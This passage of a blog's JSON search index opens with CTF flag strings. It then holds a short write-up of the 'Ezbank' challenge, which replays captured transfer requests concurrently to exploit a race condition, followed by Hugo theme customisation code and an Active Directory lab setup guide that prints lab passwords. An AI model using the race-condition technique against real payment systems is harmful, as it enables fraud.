flag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9} flag{5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ} ","date":"2025-08-28T00:00:00Z","image":"http://localhost:1313/images/14.webp","permalink":"http://localhost:1313/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAlinux2/","title":"【知攻善防靶场】Linux2"},{"content":"题目解题 1、注册一个账户，登陆并添加一个账户\n2、通过转账功能，向ID为6的账户转账\n3、转账时抓包\n4、抓包后通过测试并发获取更多钱。\n5、两个ID相互转账并多次并发，得到最后的金额购买最后一个礼物，得到flag。\n","date":"2025-08-27T00:00:00Z","image":"http://localhost:1313/images/9.webp","permalink":"http://localhost:1313/p/ctf%E8%A7%82%E5%AE%89%E6%9D%AFctf-ezbank/","title":"【CTF】观安杯CTF-Ezbank"},{"content":"0x01 搭建方式 直接拉取我的github仓库文件即可：\n1 https://github.com/SSlimes/Blog 0x02 stack主题修改 1. 字体修改： 前往【100font】，下载自己想要的字体，字体文件为 fusion-pixel-10px-monospaced-zh_hans.ttf 把字体文件放入assets/font下(文件夹自己创建) 将以下代码修改并复制到layouts/partials/footer/custom.html文件中(文件不存在就自己创建) 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;style\u0026gt; @font-face { font-family: \u0026#39;字体名\u0026#39;; src: url({{ (resources.Get \u0026#34;font/字体文件名\u0026#34;).Permalink }}) format(\u0026#39;truetype\u0026#39;); } :root { --base-font-family: \u0026#39;字体名\u0026#39;; --code-font-family: \u0026#39;字体名\u0026#39;; } \u0026lt;/style\u0026gt; 2. 背景图片 将以下代码复制到layouts/partials/footer/custom.html文件中(文件不存在则自行创建)\n1 2 3 4 5 6 7 8 9 \u0026lt;style\u0026gt; body { background: url({{ (resources.Get \u0026#34;background/bz.png\u0026#34;).Permalink }}) no-repeat center top; background-size: cover; background-attachment: fixed; backdrop-filter: blur(50px); -webkit-backdrop-filter: blur(50px); /* 注意：这里建议和上面的模糊值保持一致，避免兼容问题 */ } \u0026lt;/style\u0026gt; 3. 首页欢迎横幅 在 /layouts/index.html 的 \u0026lt;section class=\u0026quot;article-list\u0026quot;\u0026gt; 前添加以下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!-- 首页欢迎字幅 --\u0026gt; \u0026lt;div class=\u0026#34;welcome\u0026#34;\u0026gt; \u0026lt;p style=\u0026#34;font-size: 4rem; text-align: center; font-weight: bold; text-shadow: 0 2px 3px rgba(0,0,0,0.15);\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;shake\u0026#34;\u0026gt;👋\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;jump-text1\u0026#34; style=\u0026#34;color: #ffffff;\u0026#34;\u0026gt; Welcome\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;jump-text2\u0026#34; style=\u0026#34;color: #ffffff;\u0026#34;\u0026gt; To \u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;jump-text3\u0026#34; style=\u0026#34;color: #ff85b3;\u0026#34;\u0026gt;S\u0026lt;/span\u0026gt;\u0026lt;span class=\u0026#34;jump-text4\u0026#34; style=\u0026#34;color: #ff85b3;\u0026#34;\u0026gt;l\u0026lt;/span\u0026gt;\u0026lt;span class=\u0026#34;jump-text5\u0026#34; style=\u0026#34;color: #ff85b3;\u0026#34;\u0026gt;i\u0026lt;/span\u0026gt;\u0026lt;span class=\u0026#34;jump-text6\u0026#34; style=\u0026#34;color: #ff85b3;\u0026#34;\u0026gt;m\u0026lt;/span\u0026gt;\u0026lt;span class=\u0026#34;jump-text7\u0026#34; style=\u0026#34;color: #ff85b3;\u0026#34;\u0026gt;e\u0026lt;/span\u0026gt;\u0026lt;span class=\u0026#34;jump-text8\u0026#34; style=\u0026#34;color: #ff85b3;\u0026#34;\u0026gt;r\u0026lt;/span\u0026gt;\u0026lt;span class=\u0026#34;jump-text9\u0026#34; style=\u0026#34;color: #ff85b3;\u0026#34;\u0026gt;\u0026#39;\u0026lt;/span\u0026gt;\u0026lt;span class=\u0026#34;jump-text10\u0026#34; style=\u0026#34;color: #ff85b3;\u0026#34;\u0026gt;s\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;jump-text11\u0026#34; style=\u0026#34;color: #ffffff;\u0026#34;\u0026gt;Blog\u0026lt;/span\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- 首页欢迎字幅 --\u0026gt; 4. macOS风格的代码块 准备一张macOS代码块的红绿灯图片(Ctrl+S保存), 放到static/icons文件夹下 将以下代码复制进assets/scss/custom.scss文件中(不存在则自行创建) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 .highlight { border-radius: var(--card-border-radius); max-width: 100% !important; margin: 0 !important; box-shadow: var(--shadow-l1) !important; } .highlight:before { content: \u0026#34;\u0026#34;; display: block; background: url(../icons/macOS-code-header.svg) no-repeat 0; background-size: contain; height: 18px; margin-top: -10px; margin-bottom: 10px; } 5. 头像旋转 在 /assets/scss/custom.scss 中加入以下代码：\n1 2 3 4 5 6 7 8 // 头像旋转动画 .sidebar header .site-avatar .site-logo { transition: transform 1.65s ease-in-out; // 旋转时间 } .sidebar header .site-avatar .site-logo:hover { transform: rotate(360deg); // 旋转角度为360度 } ","date":"2025-08-27T00:00:00Z","image":"http://localhost:1313/images/2.webp","permalink":"http://localhost:1313/p/%E5%85%B6%E4%BB%96/","title":"【Hugo】hugo-stack主题魔改-1"},{"content":"博客运行时间 1. 完成样式 2. footer.html文件修改 在layouts\\partials\\footer\\footer.html目录下新增以下代码：（没有该文件则自己创建）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 {{ with .Site.Params.footer.runtimeSince }} \u0026lt;section class=\u0026#34;runtime\u0026#34; style=\u0026#34;margin-top:8px;font-size:1.3rem\u0026#34;\u0026gt; \u0026lt;span id=\u0026#34;site-runtime\u0026#34;\u0026gt;站点已运行计算中...\u0026lt;/span\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;script\u0026gt; (function(){ var sinceStr = \u0026#39;{{ . }}\u0026#39;.replace(\u0026#39;T\u0026#39;,\u0026#39; \u0026#39;).replace(\u0026#39;t\u0026#39;,\u0026#39; \u0026#39;); var start = new Date(sinceStr); function update(){ var now = new Date(); var diff = Math.max(0, now - start); var days = Math.floor(diff / (24*60*60*1000)); var hours = Math.floor((diff % (24*60*60*1000)) / (60*60*1000)); var mins = Math.floor((diff % (60*60*1000)) / (60*1000)); var secs = Math.floor((diff % (60*1000)) / 1000); var el = document.getElementById(\u0026#39;site-runtime\u0026#39;); if(el){ el.textContent = \u0026#39;站点已运行 \u0026#39; + days + \u0026#39; 天 \u0026#39; + hours + \u0026#39; 小时 \u0026#39; + mins + \u0026#39; 分 \u0026#39; + secs + \u0026#39; 秒\u0026#39;; } } update(); setInterval(update, 1000); })(); \u0026lt;/script\u0026gt; {{ end }} 3. 修改config.yaml文件 在config.yaml文件下新增该内容即可\n1 runtimeSince: 2025-08-025T00:00:00 # 站点开始运行的时间（本地时区），用于页脚运行时间 4. 修改custom.scss文件按 让页脚运行时间颜色与版权一致。修改\\assets\\scss\\custom.scss文件。（没有自己创建即可）\n1 2 3 4 5 6 /* 页脚运行时间颜色与版权一致 */ footer.site-footer { .runtime { color: var(--accent-color); font-weight: bold; } ","date":"2025-08-27T00:00:00Z","image":"http://localhost:1313/images/3.webp","permalink":"http://localhost:1313/p/hugohugo-stack%E4%B8%BB%E9%A2%98%E9%AD%94%E6%94%B9-%E5%8D%9A%E5%AE%A2%E8%BF%90%E8%A1%8C%E6%97%B6%E9%97%B4/","title":"【Hugo】hugo-stack主题魔改-博客运行时间"},{"content":"0x00 前置知识 需要三个windows_server虚拟机。\n这里我使用2012做主域，只能上相兼容不能向下兼容。\n使用windows_server_2012做主域，就不能使用2008做子域了。\n这就可以看出一般主域的服务器版本很低。\n三台服务器分别为（域控）（子域）（辅域）\n0x01 主域的搭建 修改网络配置为自定义的一个网段（192.16.100.1/24），为了确保都在同一网段。\n关闭防火墙\n设置IP地址：192.168.100.100为域控的IP，后续DNS服务器地址就是192.168.100.100。\n修改名称：此电脑-\u0026gt;属性，修改名称为：DC，然后重启一下。\n添加角色服务，Active Directory域服务和DNS服务器，安装好之后会自动重启一下即可。\n配置域环境，添加新林为：slimer.com后，进行等待，大约2分钟左右\n输入自己设置的密码即可（p-0p-0p-0..）\n下一步\n默认即可\n默认即可\n安装，然后重启一下，完成域控的搭建。\n重启完成后，将网卡重启一下，就可以看到域环境了。\n这里会多出来一个域防火墙，记得给关了。\n0x02 子域的搭建 关闭防火墙\n设置网卡为同一网段。\n设置IP地址，DNS为域控的IP地址。\n修改 计算机名称为:RODCServer 隶属于slimer.com域\n改： 计算机名改成administrator 密码为开机密码：p-0p-0p-0\n重启查看一下是否成功连接到slimer.com域\n安装域环境，选好之后，直接下一步安装即可。\n部署子域，新域名为：RODCServer。\n换一下自己机器的凭据。 账号：administrator 密码：p-0p-0p-0\n9.设置密码（满足复杂度） 密码：p-0p-0p-0..\n10.一直下一步，直到安装即可。\n11.在工具中找到 AD域和信任关系 就可以进行配置了，这里先这样后续再处理。\n0x03 辅域的搭建 只读域控，辅助域控\n只读域控制器（Read-only Domian Controller，RODC）的AD DS数据库只可以被读取，不可以被修改，也就是说用户或应用程序无法直接修改RODC 的AD DS数据库。RODC的AD DS数据库内容只能够从其他可读写的域控制器复制过来。RODC主要设计给远程分公司网络来使用的，因为一般来说远程分公 司的网络规模比较小，用户人数较少，此网络的安全措施或许并不如总公司完备，也可能缺乏IT技术人员，因此采用RODC可避免因其AD DS数据库被破坏 影响整个AD DS环境。\n辅助域控制器，在主域控不工作的事情下，辅助可以顶替他继续工作。\n安装SUBDCServer（辅域）\n注意：IP地址不要重复 要提前关闭防火墙\n修改IP（如上步骤）IP地址修改（与域控不同）但（首选DNS服务器选择域控IP）\n右击（这台电脑）然后点击（属性）再点击（更改配置）然后点击（更改）最后 计算机名改为（SUBDCServer） 属于选择（域）并添加为（slimer.com）\n改 计算机名（administrator） 密码（开机密码）p-0p-0p-0\n添加该两个功能，直接默认安装即可。\n将此服务器提升为域控制器即可。\n点击 将域控制器添加到现有域 点击 更改 输入域控用户和密码 账户：administrator 密码：p-0p-0p-0\n勾选域名系统服务器全局编录作为辅助域控输入密码（需要满足密码复杂性） 密码：p-0p-0p-0..\n复制自 选为 DC.slimer.com\n点击下一步 一直到 安装\n","date":"2025-08-27T00:00:00Z","image":"http://localhost:1313/images/1.webp","permalink":"http://localhost:1313/p/%E5%86%85%E7%BD%91%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-01/","title":"【内网】域环境搭建-01"}]